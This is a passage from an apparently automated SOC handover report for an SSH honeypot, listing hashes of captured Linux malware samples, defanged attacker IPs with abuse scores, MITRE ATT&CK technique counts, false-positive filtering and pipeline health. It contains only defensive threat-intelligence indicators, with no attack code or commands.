| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `150.95.25[.]34` | TH | ZCOM THAI | **100** ⚠️ | 0 |
| `68.168.211[.]82` | US | Interserver, Inc | **100** ⚠️ | 1 |
| `206.183.111[.]36` | IN | Web Werks | **100** ⚠️ | 1 |
| `165.154.6[.]26` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 26 |
| `198.98.62[.]211` | US | FranTech Solutions | **100** ⚠️ | 50 |
| `45.82.78[.]105` | SG | Detai Prosperous Technologies Limited | **100** ⚠️ | 50 |
| `185.71.233[.]73` | CZ | United Networks SE | **96** ⚠️ | 3 |
| `45.165.203[.]143` | BR | ideal comunicacao multimidia ldta | **45** | 2 |
| `103.176.16[.]70` | IN | WEBLINK | **38** | 0 |
| `187.188.10[.]255` | MX | TOTAL PLAY TELECOMUNICACIONES SA DE CV | 24 | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 75 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 61 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 12 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 6 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 6 |

---

## 🔕 False Positive Summary (34 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 13 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 2 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| AbuseIPDB score 9 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 26 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 245 cases |
| Tool 34  | Credential Extractor        | ✅ 73 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 17 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 34 filtered (13.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 17 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 12 priority case(s) shown individually · 7 recon entry/entries in table (6 group(s) consolidating 198 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-09T11:01:16Z_
